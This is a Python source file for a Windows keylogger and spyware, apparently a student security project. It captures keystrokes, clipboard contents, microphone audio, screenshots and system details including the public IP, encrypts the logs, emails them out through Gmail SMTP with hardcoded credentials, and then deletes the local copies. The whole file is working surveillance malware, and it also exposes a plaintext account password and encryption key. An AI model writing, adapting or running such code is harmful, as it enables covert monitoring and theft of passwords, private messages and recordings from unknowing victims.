import threading
from email.mime.multipart import MIMEMultipart

from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
from requests import get
import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

from PIL import ImageGrab
import shutil

audio_information = "audioInfo.wav"
system_information = "systemInfo.txt"
ss_info = "ss_info.zip"
clipboard_information = "clipboardInfo.txt"
keys_information = "key_log.txt"

encrypted_keys_information = "system_files_keys.txt"
encrypted_system_information = "system_files_info.txt"
encrypted_clipboard_information = "system_files_text.txt"

key = "hpcGE5hdtMeYyrM9BW3p7FsWc_VZ-0sE8Fb5WxKpY_Y="

max_ss = 12
time_iteration = 25
number_of_iterations_end = 2
email_address = "practicalcns@gmail.com"
password = "Test_123_practical"
toAddr = "practicalcns@gmail.com"
microphone_time = 23

file_path = "C:\\Users\\shash\\PycharmProjects\\Keylogger\\Project"
extend = "\\"
ss = "ss\\"
file_merge = file_path + extend

KEY = "dfgdfgert=564"


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        f.truncate(0)
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("public ip address: " + public_ip + '\n')
        except Exception:
            f.write("couldn't get public ip address")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
        f.close()


computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: " + pasted_data + '\n')
        except Exception:
            f.write("Clipboard could not be copied!!")


copy_clipboard()


def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)


def screenshot():
    cnt = 0
    while cnt < max_ss:
        ss_information = "screenshot" + str(cnt) + ".jpg"
        im = ImageGrab.grab()
        im.save(file_path + extend + ss + ss_information)
        cnt += 1
        time.sleep(2)

    if max_ss <= cnt:
        shutil.make_archive("ss_info", "zip", "ss")
        snd = threading.Thread(target=send_ss)
        snd.start()


ss_thread = threading.Thread(target=screenshot)
ss_thread.start()


def send_ss():
    fromAddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = "Screenshots"

    attachment = open(file_path + extend + ss_info, "rb")
    ss = MIMEBase('application', 'zip')
    ss.set_payload(attachment.read())
    encoders.encode_base64(ss)
    ss.add_header('Content-Disposition', "attachment; filename= %s" % ss_info)
    msg.attach(ss)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("practicalcns@gmail.com", "Test_123_practical")
    s.sendmail("practicalcns@gmail.com", "practicalcns@gmail.com", msg.as_string())
    s.quit()


def send_mail():
    fromAddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = "Log files"

    attachment = open(file_merge + encrypted_clipboard_information, "rb")
    c = MIMEBase('application', 'octet-stream')
    c.set_payload(attachment.read())
    encoders.encode_base64(c)
    c.add_header('Content-Disposition', "attachment; filename= %s" % clipboard_information)
    msg.attach(c)

    attachment = open(file_merge + encrypted_system_information, "rb")
    sy = MIMEBase('application', 'octet-stream')
    sy.set_payload(attachment.read())
    encoders.encode_base64(sy)
    sy.add_header('Content-Disposition', "attachment; filename= %s" % system_information)
    msg.attach(sy)

    attachment = open(file_path + extend + audio_information, "rb")
    au = MIMEBase('application', 'wav')
    au.set_payload(attachment.read())
    encoders.encode_base64(au)
    au.add_header('Content-Disposition', "attachment; filename= %s" % audio_information)
    msg.attach(au)

    attachment = open(file_merge + encrypted_keys_information, "rb")
    l = MIMEBase('application', 'octet-stream')
    l.set_payload(attachment.read())
    encoders.encode_base64(l)
    l.add_header('Content-Disposition', "attachment; filename= %s" % keys_information)
    msg.attach(l)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("practicalcns@gmail.com", "Test_123_practical")
    s.sendmail("practicalcns@gmail.com", "practicalcns@gmail.com", msg.as_string())
    s.quit()
    with open(file_path + extend + keys_information, "w") as f:
        f.write("")


number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    x = threading.Thread(target=microphone)
    x.start()
    count = 0
    keys = []


    def on_press(key):
        global keys, count, current_time

        keys.append(key)
        print(keys, end="")
        count += 1
        current_time = time.time()

        if count >= 0:
            count = 0
            write_files(keys)
            keys = []


    def write_files(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                # elif k.find("Key") == -1:
                else:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information,
                        file_merge + keys_information]
    encrypted_files = [file_merge + encrypted_system_information, file_merge + encrypted_clipboard_information,
                       file_merge + encrypted_keys_information]

    count = 0

    for encrypting_file in files_to_encrypt:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        with open(encrypted_files[count], 'wb') as f:
            f.write(encrypted)
        count += 1

    if current_time > stopping_time:
        # screenshot()
        send = threading.Thread(target=send_mail)
        send.start()
        # send_mail()
        number_of_iterations += 1
        current_time = time.time()
        stopping_time = time.time() + time_iteration


def remove_files():
    os.remove(file_merge + clipboard_information)
    os.remove(file_merge + keys_information)
    os.remove(file_merge + system_information)


remove = threading.Thread(target=remove_files)
remove.start()

'''
Reference:
https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=lbp
https://www.geeksforgeeks.org/send-mail-gmail-account-using-python/
https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory-in-python
https://code.tutsplus.com/tutorials/base64-encoding-and-decoding-using-python--cms-25588#:~:text=Base64%20is%20a%20way%20in,into%20four%207%2Dbit%20bytes.
https://stackoverflow.com/questions/26582811/gmail-python-multiple-attachments
https://realpython.com/intro-to-python-threading/
'''
